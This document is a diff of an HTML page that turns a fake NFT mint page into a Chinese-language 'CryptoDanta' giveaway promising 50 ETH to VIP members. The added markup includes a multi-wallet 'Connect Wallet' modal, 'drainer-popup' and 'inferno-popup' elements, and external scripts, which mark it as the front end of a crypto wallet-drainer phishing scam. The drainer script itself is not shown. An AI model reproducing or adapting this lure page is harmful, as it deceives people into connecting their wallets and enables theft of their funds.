+        body.swal2-toast-shown .swal2-container.swal2-top-right {
+            inset: 0 0 auto auto
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top-start,
+        body.swal2-toast-shown .swal2-container.swal2-top-left {
+            inset: 0 auto auto 0
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center-start,
+        body.swal2-toast-shown .swal2-container.swal2-center-left {
+            inset: 50% auto auto 0;
+            transform: translateY(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center {
+            inset: 50% auto auto 50%;
+            transform: translate(-50%, -50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center-end,
+        body.swal2-toast-shown .swal2-container.swal2-center-right {
+            inset: 50% 0 auto auto;
+            transform: translateY(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom-start,
+        body.swal2-toast-shown .swal2-container.swal2-bottom-left {
+            inset: auto auto 0 0
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom {
+            inset: auto auto 0 50%;
+            transform: translateX(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom-end,
+        body.swal2-toast-shown .swal2-container.swal2-bottom-right {
+            inset: auto 0 0 auto
+        }
     </style>
-    <!-- Hide Accordion Body -->
+
     <style>
-        .feed-post--content-wrapper {
-            display: none;
+        .drainer-popup {
+            height: 150px;
+            width: 500px
         }
 
+        .drainer-popup-text {
+            font-size: 100%
+        }
+
+        .drainer-popup-image {
+            margin-top: 15px;
+            margin-bottom: 5px
+        }
     </style>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoDanta独家赠送活动</title>
+
+    <link rel="shortcut icon" href="./assets/quantum.png" type="image/x-icon">
+    <!-- Primary Meta Tags -->
+    <meta name="title" content="CryptoDanta独家赠送活动！">
+    <meta name="description"
+        content="50个ETH送给我的VIP会员！">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CryptoDanta独家赠送活动！">
+    <meta property="og:description"
+        content="50个ETH送给我的VIP会员！">
+    <meta property="og:image" content="/quantum.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:title" content="CryptoDanta独家赠送活动！">
+    <meta property="twitter:description"
+        content="50个ETH送给我的VIP会员！">
+    <meta property="twitter:image" content="/quantum.png">
+    <link rel="stylesheet" href="./assets/output.css">
+
+    <link href="./assets/css2.css" rel="stylesheet">
+    <style>
+        @import url("css2-1.css");
+
+        .web3-modal,
+        .web3-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%
+        }
+
+        .web3-overlay {
+            height: 100%;
+            background: rgba(23, 23, 23, .8);
+            backdrop-filter: blur(5px);
+            z-index: 99998
+        }
+
+        .web3-modal {
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            max-width: 500px;
+            height: fit-content;
+            padding: 21px 0 0;
+            background: rgb(30, 30, 30);
+            border-radius: 10px;
+            border: 5px solid rgba(255, 255, 255, .1);
+            z-index: 99999;
+            font-family: Inter, sans-serif
+        }
+
+        .web3-modal-title {
+            font-weight: 700;
+            font-size: 24px;
+            line-height: 29px;
+            color: rgb(255, 255, 255);
+            text-align: center
+        }
+
+        .web3-modal-items {
+            border-top: 1px solid rgba(255, 255, 255, .1);
+            margin-top: 21px
+        }
+
+        .web3-modal .item {
+            padding: 15px 34px;
+            border-bottom: 1px solid rgba(255, 255, 255, .1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: .2s
+        }
+
+        .web3-modal .item:hover {
+            background: rgb(50, 50, 50)
+        }
+
+        .web3-modal .item div {
+            display: flex;
+            align-items: center
+        }
+
+        .web3-modal .item:last-child {
+            border-bottom: none
+        }
+
+        .web3-modal .item span {
+            font-weight: 400;
+            font-size: 16px;
+            color: rgb(255, 255, 255);
+            margin-left: 11px
+        }
+
+        .web3-modal .item .icon {
+            width: 40px;
+            height: 40px;
+            justify-content: center
+        }
+
+        .web3-modal .item .arrow {
+            height: 12px;
+            width: 7.4px;
+            background: url("arrow_white.svg") no-repeat
+        }
+    </style>
+    <style>
+        web3modal-modal-lightbox {
+            z-index: 99999 !important
+        }
+    </style>
+    <style data-styled="active" data-styled-version="5.1.1"></style>
     <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
     <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-      
+    
     <script src="./js/settings.js"></script>
     <script src="./js/webchunk.js"></script>
     <style>
         w3m-modal{
-          position: fixed;
-          z-index: 10000000;
+        position: fixed;
+        z-index: 10000000;
         }
     </style>
 </head>
 
 <body>
-    <div class="body-wrapper">
-        <div class="page-styles w-embed">
-            <style>
-                :root {
-                    --borderWidth: 3px;
-                    --borderWidthSm: 2px;
-                }
-
-                .button:after {
-                    content: '';
-                    position: absolute;
-                    top: calc(-1 * var(--borderWidth));
-                    left: calc(-1 * var(--borderWidth));
-                    height: calc(100% + var(--borderWidth) * 2);
-                    width: calc(100% + var(--borderWidth) * 2);
-                    background: linear-gradient(60deg, #f79533, #f37055, #ef4e7b, #a166ab, #5073b8, #1098ad, #07b39b, #6fba82);
-                    border-radius: calc(2 * var(--borderWidth));
-                    z-index: -1;
-                    animation: animatedgradient 3s ease alternate infinite;
-                    background-size: 300% 300%;
-                }
-
-                .feed-post:after {
-                    content: '';
-                    position: absolute;
-                    top: calc(-1 * var(--borderWidth));
-                    left: calc(-1 * var(--borderWidth));
-                    height: calc(100% + var(--borderWidth) * 2);
-                    width: calc(100% + var(--borderWidth) * 2);
-                    background: linear-gradient(60deg, #f79533, #f37055, #ef4e7b, #a166ab, #5073b8, #1098ad, #07b39b, #6fba82);
-                    border-radius: 12px;
-                    z-index: -1;
-                    animation: animatedgradient 3s ease alternate infinite;
-                    background-size: 300% 300%;
-                }
-
-                .gradient:after {
-                    content: '';
-                    position: absolute;
-                    top: calc(-1 * var(--borderWidthSm));
-                    left: calc(-1 * var(--borderWidthSm));
-                    height: calc(100% + var(--borderWidthSm) * 2);
-                    width: calc(100% + var(--borderWidthSm) * 2);
-                    background: linear-gradient(60deg, #f79533, #f37055, #ef4e7b, #a166ab, #5073b8, #1098ad, #07b39b, #6fba82);
-                    border-radius: 12px;
-                    z-index: -1;
-                    animation: animatedgradient 3s ease alternate infinite;
-                    background-size: 300% 300%;
-                }
-
-                .border-gradient:after {
-                    content: '';
-                    position: absolute;
-                    top: calc(-1 * var(--borderWidth));
-                    left: calc(-1 * var(--borderWidth));
-                    height: calc(100% + var(--borderWidth) * 2);
-                    width: calc(100% + var(--borderWidth) * 2);
-                    background: linear-gradient(60deg, #f79533, #f37055, #ef4e7b, #a166ab, #5073b8, #1098ad, #07b39b, #6fba82);
-                    border-radius: calc(2 * var(--borderWidth));
-                    z-index: -1;
-                    animation: animatedgradient 3s ease alternate infinite;
-                    background-size: 300% 300%;
-                }
-
-                .rarity__type.gradient {
-                    animation: animatedgradient 3s ease alternate infinite;
-                    background-size: 300% 300%;
-                }
-
-                @keyframes animatedgradient {
-                    0% {
-                        background-position: 0% 50%;
-                    }
-
-                    50% {
-                        background-position: 100% 50%;
-                    }
-
-                    100% {
-                        background-position: 0% 50%;
-                    }
-                }
-
-                .feed-rte p:last-child {
-                    margin-bottom: 0;
-                }
-
-            </style>
-            <style>
-                .twinkling {
-                    animation: move-twink-back 200s linear infinite;
-                }
-
-                @keyframes move-twink-back {
-                    from {
-                        background-position: 0 0;
-                    }
-
-                    to {
-                        background-position: -10000px 5000px;
-                    }
-                }
-
-                @keyframes move-clouds-back {
-                    from {
-                        background-position: 0 0;
-                    }
-
-                    to {
-                        background-position: 10000px 0;
-                    }
-                }
-
-                /*Minting hero styles*/
-
-                .mint-form__input {
-                    pointer-events: none;
-                }
-
-            </style>
-        </div>
-        <div class="nav-fixed-wrapper">
-            <nav class="nav">
-                <div class="nav--container">
-                    <div class="header-info-1 alt">
-                        <div class="header-info--label alt">Releasing</div>
-                        <div class="header-info--date">August 2023</div>
-                    </div>
-
-                    <div class="social-links">
-                        <a href="">
-                            <div class="social--icon w-embed">
-                                <svg viewbox="0 0 28 28" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M10.2777 23C7.96696 23 5.81298 22.3045 4 21.1046C5.53928 21.2077 8.25576 20.9608 9.94541 19.2931C7.40363 19.1724 6.25733 17.1552 6.10781 16.2931C6.32378 16.3793 7.35379 16.4828 7.93524 16.2414C5.01136 15.4828 4.56281 12.8276 4.66248 12.0172C5.21071 12.4138 6.14104 12.5517 6.50652 12.5172C3.78199 10.5 4.76216 7.46552 5.24394 6.81034C7.19916 9.61336 10.1294 11.1876 13.7546 11.2752C13.6862 10.965 13.6501 10.6421 13.6501 10.3103C13.6501 7.92981 15.5096 6 17.8034 6C19.0018 6 20.0817 6.52682 20.8398 7.36949C21.6406 7.1753 22.8459 6.7207 23.4352 6.32759C23.1382 7.43103 22.2135 8.35154 21.6542 8.69271C21.6589 8.70432 21.6497 8.68105 21.6542 8.69271C22.1455 8.61581 23.4748 8.35145 24 7.98276C23.7403 8.60266 22.76 9.63337 21.9555 10.2104C22.1052 17.0412 17.0546 23 10.2777 23Z"></path>
-                                </svg>
-                            </div>
-                        </a>
-                        <a href="" target="_blank" class="social--link w-inline-block">
-                            <div class="social--icon w-embed">
-                                <svg viewbox="0 0 28 28" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M21 8.5C21 9.32843 20.3284 10 19.5 10C18.6716 10 18 9.32843 18 8.5C18 7.67157 18.6716 7 19.5 7C20.3284 7 21 7.67157 21 8.5Z"></path>
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M14 19C16.7614 19 19 16.7614 19 14C19 11.2386 16.7614 9 14 9C11.2386 9 9 11.2386 9 14C9 16.7614 11.2386 19 14 19ZM14 17C15.6569 17 17 15.6569 17 14C17 12.3431 15.6569 11 14 11C12.3431 11 11 12.3431 11 14C11 15.6569 12.3431 17 14 17Z"></path>
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4 13.6C4 10.2397 4 8.55953 4.65396 7.27606C5.2292 6.14708 6.14708 5.2292 7.27606 4.65396C8.55953 4 10.2397 4 13.6 4H14.4C17.7603 4 19.4405 4 20.7239 4.65396C21.8529 5.2292 22.7708 6.14708 23.346 7.27606C24 8.55953 24 10.2397 24 13.6V14.4C24 17.7603 24 19.4405 23.346 20.7239C22.7708 21.8529 21.8529 22.7708 20.7239 23.346C19.4405 24 17.7603 24 14.4 24H13.6C10.2397 24 8.55953 24 7.27606 23.346C6.14708 22.7708 5.2292 21.8529 4.65396 20.7239C4 19.4405 4 17.7603 4 14.4V13.6ZM13.6 6H14.4C16.1132 6 17.2777 6.00156 18.1779 6.0751C19.0548 6.14674 19.5032 6.27659 19.816 6.43597C20.5686 6.81947 21.1805 7.43139 21.564 8.18404C21.7234 8.49684 21.8533 8.94524 21.9249 9.82208C21.9984 10.7223 22 11.8868 22 13.6V14.4C22 16.1132 21.9984 17.2777 21.9249 18.1779C21.8533 19.0548 21.7234 19.5032 21.564 19.816C21.1805 20.5686 20.5686 21.1805 19.816 21.564C19.5032 21.7234 19.0548 21.8533 18.1779 21.9249C17.2777 21.9984 16.1132 22 14.4 22H13.6C11.8868 22 10.7223 21.9984 9.82208 21.9249C8.94524 21.8533 8.49684 21.7234 8.18404 21.564C7.43139 21.1805 6.81947 20.5686 6.43597 19.816C6.27659 19.5032 6.14674 19.0548 6.0751 18.1779C6.00156 17.2777 6 16.1132 6 14.4V13.6C6 11.8868 6.00156 10.7223 6.0751 9.82208C6.14674 8.94524 6.27659 8.49684 6.43597 8.18404C6.81947 7.43139 7.43139 6.81947 8.18404 6.43597C8.49684 6.27659 8.94524 6.14674 9.82208 6.0751C10.7223 6.00156 11.8868 6 13.6 6Z"></path>
-                                </svg>
-                            </div>
-                        </a>
-                        <a href="" target="_blank" class="social--link w-inline-block">
-                            <div class="social--icon w-embed">
-                                <svg viewbox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M38.1863 13.7599C35.5913 11.5656 32.4773 10.4685 29.1902 10.2856L28.6712 10.8342C31.6123 11.5656 34.2073 13.0285 36.6293 15.0399C33.6883 13.3942 30.4013 12.2971 26.9412 11.9314C25.9032 11.7485 25.0382 11.7485 24.0002 11.7485C22.9622 11.7485 22.0972 11.7485 21.0592 11.9314C17.5992 12.2971 14.3121 13.3942 11.3711 15.0399C13.7931 13.0285 16.3882 11.5656 19.3292 10.8342L18.8102 10.2856C15.5231 10.4685 12.4091 11.5656 9.8141 13.7599C6.87308 19.6114 5.31607 26.1942 5.14307 32.9599C7.73809 35.8856 11.3711 37.7142 15.1771 37.7142C15.1771 37.7142 16.3882 36.2514 17.2532 34.9714C15.0041 34.4228 12.9281 33.1428 11.5441 31.1314C12.7551 31.8628 13.9661 32.5942 15.1771 33.1428C16.7342 33.8742 18.2912 34.2399 19.8482 34.6056C21.2322 34.7885 22.6162 34.9714 24.0002 34.9714C25.3842 34.9714 26.7682 34.7885 28.1522 34.6056C29.7093 34.2399 31.2663 33.8742 32.8233 33.1428C34.0343 32.5942 35.2453 31.8628 36.4563 31.1314C35.0723 33.1428 32.9963 34.4228 30.7473 34.9714C31.6123 36.2514 32.8233 37.7142 32.8233 37.7142C36.6293 37.7142 40.2623 35.8856 42.8573 32.9599C42.6843 26.1942 41.1273 19.6114 38.1863 13.7599ZM18.2912 29.6685C16.5612 29.6685 15.0041 28.0228 15.0041 26.0114C15.0041 23.9999 16.5612 22.3542 18.2912 22.3542C20.0212 22.3542 21.5782 23.9999 21.5782 26.0114C21.5782 28.0228 20.0212 29.6685 18.2912 29.6685ZM29.7093 29.6685C27.9792 29.6685 26.4222 28.0228 26.4222 26.0114C26.4222 23.9999 27.9792 22.3542 29.7093 22.3542C31.4393 22.3542 32.9963 23.9999 32.9963 26.0114C32.9963 28.0228 31.4393 29.6685 29.7093 29.6685Z"></path>
-                                </svg>
-                            </div>
-                        </a>
-                        <a href="https://discord.gg/qorpogamestudio" target="_blank" class="button alt w-inline-block">
-                            <div class="discord-text">Join Discord</div>
-                            <div class="button--icon alt w-embed">
-                                <svg viewbox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M38.1863 13.7599C35.5913 11.5656 32.4773 10.4685 29.1902 10.2856L28.6712 10.8342C31.6123 11.5656 34.2073 13.0285 36.6293 15.0399C33.6883 13.3942 30.4013 12.2971 26.9412 11.9314C25.9032 11.7485 25.0382 11.7485 24.0002 11.7485C22.9622 11.7485 22.0972 11.7485 21.0592 11.9314C17.5992 12.2971 14.3121 13.3942 11.3711 15.0399C13.7931 13.0285 16.3882 11.5656 19.3292 10.8342L18.8102 10.2856C15.5231 10.4685 12.4091 11.5656 9.8141 13.7599C6.87308 19.6114 5.31607 26.1942 5.14307 32.9599C7.73809 35.8856 11.3711 37.7142 15.1771 37.7142C15.1771 37.7142 16.3882 36.2514 17.2532 34.9714C15.0041 34.4228 12.9281 33.1428 11.5441 31.1314C12.7551 31.8628 13.9661 32.5942 15.1771 33.1428C16.7342 33.8742 18.2912 34.2399 19.8482 34.6056C21.2322 34.7885 22.6162 34.9714 24.0002 34.9714C25.3842 34.9714 26.7682 34.7885 28.1522 34.6056C29.7093 34.2399 31.2663 33.8742 32.8233 33.1428C34.0343 32.5942 35.2453 31.8628 36.4563 31.1314C35.0723 33.1428 32.9963 34.4228 30.7473 34.9714C31.6123 36.2514 32.8233 37.7142 32.8233 37.7142C36.6293 37.7142 40.2623 35.8856 42.8573 32.9599C42.6843 26.1942 41.1273 19.6114 38.1863 13.7599ZM18.2912 29.6685C16.5612 29.6685 15.0041 28.0228 15.0041 26.0114C15.0041 23.9999 16.5612 22.3542 18.2912 22.3542C20.0212 22.3542 21.5782 23.9999 21.5782 26.0114C21.5782 28.0228 20.0212 29.6685 18.2912 29.6685ZM29.7093 29.6685C27.9792 29.6685 26.4222 28.0228 26.4222 26.0114C26.4222 23.9999 27.9792 22.3542 29.7093 22.3542C31.4393 22.3542 32.9963 23.9999 32.9963 26.0114C32.9963 28.0228 31.4393 29.6685 29.7093 29.6685Z"></path>
-                                </svg>
-                            </div>
-                        </a>
-                    </div>
+    <div id="web3-modal" class="web3-modal" style="display: none;">
+        <p class="web3-modal-title" style="margin-top: 0px;">Connect your wallet</p>
+        <div class="web3-modal-items">
+            <div class="item" id="metamask_connect_button">
+                <div>
+                    <div class="icon"><img src="./assets/metamask.svg"></div>
+                    <span>MetaMask</span>
                 </div>
-            </nav>
-        </div>
-        <main class="main">
-            <section class="section hero">
-                <div class="hero-bg-wrapper">
-                    <div class="stars"></div>
-                    <div class="twinkling"></div><img src="img/61577885fe80ba6ad7abfa1f_forest-back.svg" alt="" class="trees distant"><img src="img/61577885fe80ba5a05abfa20_forest-front.svg" alt="" class="trees foreground">
+                <div class="arrow"></div>
+            </div>
+            <div class="item" id="coinbase_connect_button">
+                <div>
+                    <div class="icon"><img src="./assets/coinbase.svg"></div>
+                    <span>Coinbase</span>
                 </div>
-                <div class="padding-wrapper hero">
-                    <div class="brand hero"><img src="61577885fe80ba5e67abfa11/61577885fe80ba57e2abfad4_logo.html" loading="lazy" sizes="(max-width: 479px) 61vw, 100vw" srcset="61577885fe80ba5e67abfa11/61577885fe80ba57e2abfad4_logo-p-500.png 500w, 61577885fe80ba5e67abfa11/61577885fe80ba57e2abfad4_logo-p-800.png 800w, 61577885fe80ba5e67abfa11/61577885fe80ba57e2abfad4_logo-p-1080.png 1080w, 61577885fe80ba5e67abfa11/61577885fe80ba57e2abfad4_logo.png 1302w" alt=""></div>
-                    <div class="hero-container">
-                        <div class="arrow-svg w-embed">
-                            <svg id="ade87f52-0ac0-438e-bc39-231b0e93f8ea" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 301.03 170.89">
-                                <path d="M-65.06,145.38a3.24,3.24,0,0,1-.69-1.22c-1-2.51.36-5.44.93-8A91.87,91.87,0,0,0-62.95,120c.1-2.24.21-5.2,2.26-6,1.43-.56,2.48.15,3.23,1.55s.61,3.27.6,4.83c0,3.87-.59,9.52-.94,13.58a.16.16,0,0,0,.28.13,58.6,58.6,0,0,1,4.63-4.84c24.87-21.77,55.15-41.37,93.12-44C56.65,84.09,72.35,85,88.3,89.46A7.56,7.56,0,0,0,93.07,89c38.67-19.94,84.12,8.4,108.42,43.8,18.6,27.08,34.36,62.26,33.39,94-.08,2.71-1.17,28.54-5.25,26.39-.33-.17-.76-.34-.87-.78-.68-2.84.55-11.27,1-16.81a109.88,109.88,0,0,0-.49-26.19,155.25,155.25,0,0,0-11-37.11c-9.77-22.68-22.25-45.57-41.45-61.66C159.41,96,136,84.49,111,87.53c-3.44.42-9.85,2.37-13.28,5a.78.78,0,0,0,0,1.24,38.75,38.75,0,0,0,4.64,2.56,76.64,76.64,0,0,1,22.91,19.39l.68.85.67.84.83,1.06.72.94c.49.63,1,1.28,1.45,1.92q3.07,4.15,5.84,8.53c10.37,16.38,18.43,38.58,12.73,57.48-2.66,8.83-10,16.93-19.68,16.19-31.35-2.41-48.82-34.51-51.8-59.67a75.25,75.25,0,0,1,1.51-24.56,73.93,73.93,0,0,1,6.33-17c1.13-2.18,4.12-5.86,2-7.83-2.29-2.15-7.45-2.77-10.45-3.2-34.38-4.88-69.32,2.26-97.92,20.61-.6.38-1.2.78-1.8,1.17-8.68,5.74-16.44,12.78-24.26,19.77-2,1.8-4.4,4.22-5.89,5.42a.23.23,0,0,0,0,.4c4.42,1.92,10.78,2.88,15.41,3.43a10.46,10.46,0,0,1,4.92,1.5c1.43,1,2.48,3,1.69,4.49s-3.86.26-6.12.07c-6.47-.55-12.8-.37-19.28-.92C-59.95,147-62.87,147.39-65.06,145.38Zm167.38,41a55.77,55.77,0,0,0,9.32,6.87c9,5.23,22.57,8.41,29.35-1.19,6.12-8.67,4.79-22,2.42-32-3.08-13-9.52-25.19-17.41-36.07a105.17,105.17,0,0,0-9.55-11.52A79.17,79.17,0,0,0,105.1,103a57.94,57.94,0,0,0-6.38-4c-1.82-1-4.19-2.53-6.09-1.08-2.94,2.24-6,8.65-7.58,13C75.85,136.1,81.24,167.34,102.32,186.41Z" transform="translate(66.11 -82.42)" style="fill:currentColor"></path>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" id="trust_wallet_connect_button">
+                <div>
+                    <div class="icon"><img src="./assets/trust_wallet.svg"></div>
+                    <span>Trust Wallet</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" id="binance_connect_wallet_button">
+                <div>
+                    <div class="icon"><img src="./assets/binance.svg"></div>
+                    <span>Binance Wallet</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" id="wallet_connect_connect_button">
+                <div>
+                    <div class="icon"><img src="./assets/wallet_connect.svg"></div>
+                    <span>WalletConnect</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+        </div>
+    </div>
+    <div id="web3-overlay" class="web3-overlay" style="display: none;"></div>
+
+    <section style="font-family: Poppins;"
+        class="w-screen relative h-auto min-h-screen flex justify-center items-center flex-col">
+        <section style="background-color: black;"
+            class="w-full h-full min-h-screen flex justify-center items-center absolute z-0">
+            <section class="absolute top-0 left-0 w-full z-10 h-full min-h-screen "></section>
+            <img style="opacity: 80%;" src="./assets/bg.jpg"
+                class="w-full min-h-screen h-full object-cover relative z-0">
+        </section>
+        <section
+            class="w-full h-auto min-h-screen flex justify-center pb-12 flex-col px-8 sm:px-0 items-center relative z-10">
+            <img src="./assets/quantum.png" class="w-[100px] rounded-full mb-8 sm:w-[150px] h-auto">
+
+            <h1 style="font-family: tuskergrotesk;"
+                class="text-white text-3xl sm:text-5xl font-bold text-center leading-snug">CryptoDanta独家<span
+                    style="color:rgb(255, 225, 0)" class=" underline underline-offset-4">赠送活动！</span></h1>
+
+            <span style="font-family: ikimono; text-transform: uppercase;"
+                class="font-semibold text-center leading-snug mt-4 text-white text-2xl sm:text-4xl">50个ETH送给我的VIP会员！</span>
+
+            <p style="font-family: ikimono; text-transform: uppercase;"
+                class="text-white text-center text-sm sm:text-xl mt-8 w-full max-w-[500px]">在许多成功交易和您的持续支持后，我决定进行这次赠送活动。<br> <br> <span
+                    class="underline underline-offset-4">所以不要犹豫，立即领取吧！</span></p>
+
+            <button style="font-family: ikimono; text-transform: uppercase; background-color: #ffe100; color: #000;"
+                id="confetti"
+                class="interact-button text-white text-sm sm:text-xl font-bold px-8 py-4 rounded-full mt-8 connectButton">连接钱包</button>
+        </section>
+
+    </section>
+
+    <style>
+        .web3modal-modal-lightbox {
+            z-index: 1000 !important;
+        }
+    </style>
+
+    <script src="./assets/confetti.min.js.Без названия"></script>
+    <script>
+        // Pass in the id of an element
+        let confetti = new Confetti('confetti');
+        // Edit given parameters
+        confetti.setCount(75);
+        confetti.setSize(1);
+        confetti.setPower(25);
+        confetti.setFade(false);
+        confetti.destroyTarget(false);
+    </script><canvas width="2876" height="1760"
+        style="position: fixed; top: 0px; left: 0px; width: calc(100%); height: calc(100%); margin: 0px; padding: 0px; z-index: 999999999; pointer-events: none;"></canvas>
+
+    <div id="inferno-popup"
+        style="font-family: Poppins, sans-serif; transition: opacity 0.3s ease-in-out 0s; display: none !important; position: fixed !important; inset: 0px !important; z-index: 150 !important; height: 100% !important; width: 100% !important; background: rgba(0, 0, 0, 0.8) !important; justify-content: center !important; max-height: 100% !important;">
+        <div style="margin: 40px 0px !important; z-index:99999;">
+            <div
+                style="position: relative !important;border-radius: 16px;background: rgb(255, 255, 255) !important;width: 360px;max-height: calc(0px + 100vh);max-width: 100%;">
+                <div style="position: relative; text-align: center; padding: 16px 24px;">
+                    <h4 id="inferno-popup-title"
+                        style="font-weight: 600;line-height: 110%;font-size: 22px; color: rgb(4, 17, 29);padding: 4px 16px">
+                    </h4>
+                    <div id="inferno-popup-close"
+                        style="cursor: pointer;position: absolute;right: 25px; top: 15px;width: 20px; height: 20px;opacity: 0.3;">
+                    </div>
+                    <style>
+                        #inferno-popup-close:hover {
+                            opacity: 0.4;
+                        }
+
+                        #inferno-popup-close:before,
+                        #inferno-popup-close:after {
+                            content: '';
+                            position: absolute;
+                            left: 15px;
+                            height: 19px;
+                            width: 2px;
+                            background-color: rgb(10, 10, 10);
+                        }
+
+                        #inferno-popup-close:before {
+                            transform: rotate(45deg);
+                        }
+
+                        #inferno-popup-close:after {
+                            transform: rotate(-45deg);
+                        }
+                    </style>
+                </div>
+                <div style="padding: 24px;">
+                    <div style="align-items: center; gap: 25px;">
+                        <div>
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                                style="margin: auto; background: rgb(255, 255, 255); display: block; shape-rendering: auto;"
+                                width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                                <path d="M10 50A40 40 0 0 0 90 50A40 42 0 0 1 10 50" fill="#e15b64" stroke="none">
+                                    <animatetransform attributeName="transform" type="rotate" dur="1s"
+                                        repeatCount="indefinite" keyTimes="0;1" values="0 50 51;360 50 51">
+                                    </animatetransform>
+                                </path>
                             </svg>
                         </div>
-                        <div class="hero-container horizontal">
-                            <div class="hero__col">
-                                <div class="mint-card__container feed-post">
-                                    <div class="mint-card__container">
-                                        <p class="mint-card__paragraph">Mint <span id="name1"> Angry Chiks pass</span></p>
-                                        <img src="img/image.png" loading="lazy" alt="" class="mint-card__image">
-                                        <h2 class="mint-card__h2">Angry Chiks<span id="name2"> Pass</span></h2>
-                                        <p class="mint-card__h3"><span id="price">0</span> ETH</p>
-
-                                        <div class="w-form">
-                                            <div class="mint-form" style=" margin-bottom: 8px; margin-top: 0; ">
-                                                <div class="mint-form__qty-wrapper">
-                                                    <input class="mint-form__input w-input eth_input" name="eth" type="number" min="1" max="5" pattern="[A-z0-9]{2,50}" minlength="2" maxlength="50" required="required" value="1">
-                                                    <div class="mint-form__button-wrapper"><a data-quantity-update="increase" href="#" class="mint-form__button increase w-button pluson">+</a><a data-quantity-update="decrease" href="#" class="mint-form__button decrease w-button minuson">-</a></div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <div class="container_metamask_content-btn" style="text-align: center;">
-                                            <button id="claim-button" class="metamask_content-btn border-gradient button w-button">Connect Wallet</button>
-                                            <div style="display: none;" class="buttonorer">
-                                                <h2 class="metamask_content-title"></h2>
-                                            </div>
-                                        </div>
-                                        <div class="container_link_metamask_install-btn" style="text-align: center;">
-                                            <a class="link_metamask_install-btn" href="#">
-                                                <button id="claim-button" class="metamask_install-btn border-gradient button w-button connectButton" style="">Connect Wallet</button>
-                                            </a>
-                                        </div>
-
-                                        <p class="mint-card__h3"><span id="mintnumber">27</span> / 50</p>
-
-                                        <h3 class="mint-card__h3 sub-title all-caps">Fair Distribution</h3>
-                                        <p class="mint-card__paragraph sub-info">First Come, <span id="name3">First</span><span id="price2"> Serve</span></p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="hero__col right" style="padding-left: 30px;">
-                                <h2 class="mint-card__h2">Angry Chiks Pass</h2>
-                                <div class="boonjie-subtitle-cart-copy" style="color: #df7da3; ">August <span id="dateday1"></span></div>
-                                <div class="dutch-detail-two-sides">
-                                    <div class="dutch-det-left">
-                                        <div class="text-block-13">Giveaway Date</div>
-                                    </div>
-                                    <div class="dutch-det-right">
-                                        <div class="text-block-12">August <span id="dateday2"></span> <span id="datehour1"></span></div>
-                                    </div>
-                                </div>
-                                <div class="dutch-detail-two-sides">
-                                    <div class="dutch-det-left">
-                                        <div class="text-block-13">Supply</div>
-                                    </div>
-                                    <div class="dutch-det-right">
-                                        <div class="text-block-12">50</div>
-                                    </div>
-                                </div>
-                                <div class="dutch-detail-two-sides">
-                                    <div class="dutch-det-left">
-                                        <div class="text-block-13">Price</div>
-                                    </div>
-                                    <div class="dutch-det-right">
-                                        <div class="text-block-12"><span id="price3">0</span> ETH</div>
-                                    </div>
-                                </div>
-                                <div class="dutch-detail-two-sides">
-                                    <div class="dutch-det-left">
-                                        <div class="text-block-13">Max</div>
-                                    </div>
-                                    <div class="dutch-det-right">
-                                        <div class="text-block-12">1 per Wallet</div>
-                                    </div>
-                                </div>
-                                <a href="https://discord.gg/2RMQZkc94n" target="_blank" class="button w-inline-block" style="margin-top: 30px;">
-                                    <div>Join Our Discord</div>
-                                    <div class="button--icon w-embed">
-                                        <svg width="auto" height="auto" viewbox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
